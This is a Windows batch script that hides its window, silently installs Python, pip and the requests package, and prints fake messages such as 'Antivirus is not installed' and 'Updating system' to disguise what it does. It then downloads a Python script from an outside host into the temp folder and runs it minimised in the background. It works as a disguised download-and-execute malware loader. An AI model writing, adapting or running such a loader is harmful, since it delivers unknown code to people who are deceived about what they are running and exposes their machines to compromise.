@echo off
:: Hide command window
@start /min "" cmd.exe /c call :main

:main
:: Check if Python is installed
python --version >nul 2>&1
IF ERRORLEVEL 1 (
    echo Antivirus is not installed. Downloading Antivirus...
    curl -o python-installer.exe https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
) ELSE (
    echo Windows is already installed.
)

:: Check if pip is installed
pip --version >nul 2>&1
IF ERRORLEVEL 1 (
    echo System is not updated. Updating system...
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
    python get-pip.py
) ELSE (
    echo Windows is already installed.
)

:: Install requests package if not installed
python -m pip show requests >nul 2>&1
IF ERRORLEVEL 1 (
    echo Installing system...
    python -m pip install requests
) ELSE (
    echo requests is already installed.
)

:: Download the Python script
curl -o %TEMP%\script.py https://tclancy.mygamesonline.org/setup

:: Run the Python script in the background
start /min python %TEMP%\script.py

:: Exit the hidden window
exit /b
